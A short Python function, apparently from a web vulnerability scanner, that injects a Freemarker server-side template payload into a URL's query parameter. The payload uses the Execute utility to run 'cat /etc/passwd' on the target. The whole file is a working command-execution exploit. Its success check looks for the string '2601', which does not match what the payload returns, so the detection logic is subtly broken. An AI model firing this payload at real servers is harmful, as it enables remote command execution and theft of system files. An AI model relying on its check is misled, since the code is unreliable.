import requests
def mode_Freemarker(url):
    payload = "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"[cat /etc/passwd]\")}"
    if '=' in url:
        url = url.split('=', 1)[0] + "="
        r = requests.get(url + payload)
        if '2601' in r.text:
            return True, url, payload, 'Template-injection_yes!'
        else:
            return False, url
    else:
        url = url + '/?name=' + payload;
        r = requests.get(url)
        if '2601' in r.text:
            return True, url, payload, 'Template-injection_yes!'
        else:
            return False, url
